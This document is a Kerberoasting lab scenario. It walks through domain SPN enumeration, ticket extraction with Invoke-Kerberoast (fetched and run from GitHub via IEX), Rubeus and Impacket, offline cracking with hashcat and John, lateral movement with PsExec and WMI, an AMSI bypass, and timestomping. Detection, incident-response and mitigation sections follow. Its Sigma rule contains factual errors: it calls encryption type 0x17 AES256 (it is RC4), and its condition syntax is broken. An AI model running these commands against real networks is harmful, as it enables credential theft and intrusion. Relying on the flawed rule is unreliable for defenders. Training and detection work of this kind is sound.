# Attack Scenario: Kerberoasting Campaign

**Author:** Poulomi Dwivedi  
**Difficulty:** Intermediate  
**Estimated Time:** 2-3 hours  
**MITRE ATT&CK Techniques:** T1558.003 (Steal Service Tickets), T1018 (Remote System Discovery), T1040 (Network Sniffing)  

---

## Scenario Overview

In this scenario, you assume the role of an attacker who has gained low-privileged user access to a domain-joined Windows workstation in a target organization's network. Your objective is to extract Kerberos TGS (Ticket Granting Service) tickets for service accounts, crack the associated passwords offline, and use the compromised credentials for lateral movement.

## Learning Objectives

- Understand Kerberos authentication flow and vulnerabilities
- Learn how to enumerate service accounts in Active Directory
- Practice TGS ticket extraction and offline cracking
- Understand detection signatures for Kerberoasting activity
- Develop incident response procedures for Kerberos attacks

## Lab Prerequisites

- Domain-joined Windows 10/11 workstation (compromised)
- Active Directory domain with 3-5 service accounts
- Kerberoast tool (Invoke-Kerberoast PowerShell script)
- Hashcat or JohnTheRipper for offline cracking
- Splunk/Sentinel SIEM with Sysmon agent
- Network monitoring (Wireshark or similar)

## Attack Timeline

### Phase 1: Reconnaissance & Discovery (30 mins)

**Objective:** Enumerate the domain and identify service accounts

```powershell
# Enumerate domain users with SPNs (Service Principal Names)
Get-ADUser -Filter * -Properties Name,ServicePrincipalName,DistinguishedName | Where-Object {$_.ServicePrincipalName -ne $null}

# Alternative: Using Rubeus
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Using PowerShell
$users = Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null}
$users | ForEach-Object { Write-Host "User: $($_.Name) - SPN: $($_.ServicePrincipalName)" }
```

**Expected Artifacts:**
- `Get-ADUser` command execution (EventID 1 - Sysmon process creation)
- PowerShell script block logging (EventID 4104)
- LDAP query traffic (network anomaly)

### Phase 2: Kerberoasting Attack (45 mins)

**Objective:** Extract TGS tickets for identified service accounts

```powershell
# Method 1: Using Invoke-Kerberoast (Empire/Mimikatz)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File hashes.txt

# Method 2: Using Rubeus
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

# Method 3: Using GetUserSPNs.py (Impacket)
python3 GetUserSPNs.py -request -dc-ip 192.168.1.100 domain.local/username:password -outputfile hashes.txt
```

**Expected Artifacts:**
- Multiple `TGT` (Ticket Granting Ticket) requests (EventID 4768)
- Multiple `TGS` requests for service accounts (EventID 4769)
- PowerShell script execution from unusual path
- Memory dump attempts (EventID 1 with LSASS process)
- Suspicious LDAP queries for SPNs

### Phase 3: Offline Cracking (60+ mins)

**Objective:** Crack the extracted ticket hashes to recover passwords

```bash
# Using Hashcat
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Using JohnTheRipper
john --format=krb5tgs --wordlist=rockyou.txt kerberoast_hashes.txt

# Extract cracked passwords
john kerberoast_hashes.txt --show
```

**Performance Considerations:**
- Dictionary attack: 30-60 minutes (rockyou.txt)
- Hybrid attack: 1-2 hours (masks + wordlist)
- Brute force: Not practical in lab setting

### Phase 4: Validation & Lateral Movement (30 mins)

**Objective:** Verify cracked credentials and move laterally

```powershell
# Test credentials with "Run As" on sensitive server
runas /user:domain\serviceaccount_name cmd.exe

# Or use PSExec to execute commands
.\PsExec.exe -u domain\serviceaccount_name -p "password" \\targetserver cmd.exe

# Or use WMI for remote execution
Invoke-WmiMethod -ComputerName targetserver -Class Win32_Process -Name Create -ArgumentList "cmd.exe"
```

## Detection Signatures

### Sigma Rule: Kerberoasting Detection

```yaml
title: Kerberoasting - TGS Ticket Request for Service Account
status: test
description: |
  Detects potential Kerberoasting attack by monitoring for unusual patterns
  of Kerberos service ticket requests in a short time window
logsource:
  product: windows
  service: security
detection:
  tgs_requests:
    EventID: 4769
    Status: '0x0'  # Success
    TicketEncryptionType: '0x17'  # AES256 - indicates crackable ticket
  filter:
    - TargetUserName: 'krbtgt'  # Exclude KDC account
    - ServiceName: 'krbtgt'  # Exclude Kerberos service
  timeframe: 5m
  condition: tgs_requests > 50 | filter
alarmtitle: Multiple TGS Requests Detected - Possible Kerberoasting
alarmseverity: High
```

### Expected SIEM Events

1. **EventID 4768 (TGT Request)**
   - High volume of TGT requests from low-privileged user
   - Unusual hours (off-business hours)
   
2. **EventID 4769 (TGS Request)**
   - Multiple TGS requests in short timeframe
   - Requests for disabled service accounts
   - Non-existent service accounts

3. **PowerShell Script Block Logging (EventID 4104)**
   - Invoke-Kerberoast script execution
   - LDAP query for SPN enumeration
   - Base64-encoded script content

4. **Sysmon EventID 1 (Process Creation)**
   - powershell.exe with suspicious arguments
   - Kerberoast tool execution
   - Hashcat or John processes

## Defense Evasion Techniques

### Evasion 1: Living Off the Land
```powershell
# Use only built-in tools - Get-ADUser instead of custom scripts
Get-ADUser -Filter {ServicePrincipalName -ne $null} | Select-Object Name,ServicePrincipalName
```

### Evasion 2: AMSI Bypass
```powershell
# Bypass Windows Defender AMSI
$x = @"
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',  [Reflection.BindingFlags]'NonPublic,Static').GetValue($null), 0x41414141)
"@
PowerShell -C $x
```

### Evasion 3: Timestomping
```cmd
# Modify file modification times to evade forensics
downloads\timestomp.exe kerberoast_hashes.txt "2024-01-15 09:00:00"
```

## Incident Response Procedures

### Alert Triggers

1. **Immediate Investigation Required:**
   - 20+ TGS requests in 5 minutes from single user
   - TGS requests for disabled service accounts
   - TGS requests from 3AM-5AM

2. **Containment Actions:**
   - Isolate compromised workstation from network
   - Reset service account passwords immediately
   - Review DCDIAG output for KDC health
   - Check for token impersonation or other lateral movement

3. **Forensic Preservation:**
   - Preserve Windows event logs (Security, PowerShell)
   - Memory dump of LSASS process
   - Disk image of compromised workstation
   - Network pcap during investigation period

## Recommended Mitigations

1. **Strong Service Account Passwords** (16+ characters, special characters)
2. **Managed Service Accounts (gMSA)** - Automatic password rotation
3. **Kerberos Encryption** - Enforce AES256 instead of RC4
4. **Service Account Monitoring** - Alert on TGS requests for critical accounts
5. **Least Privilege** - Don't use service accounts for user logon
6. **EDR Solutions** - Monitor LSASS access and memory dumps

## Tools Required

- Invoke-Kerberoast.ps1
- Rubeus.exe
- Hashcat or JohnTheRipper
- Impacket suite (GetUserSPNs.py)
- PsExec.exe (for testing)
- Wireshark (optional - for network analysis)

## References

- [Empire Kerberoast Module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
- [Rubeus - Kerberoasting](https://github.com/GhostPack/Rubeus)
- [Impacket GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
- [SpecterOps - Kerberoasting](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d9)

---

*Lab Scenario - Educational Use Only*  
*All activities must remain within isolated test environment*  
*Unauthorized access to computer systems is illegal*
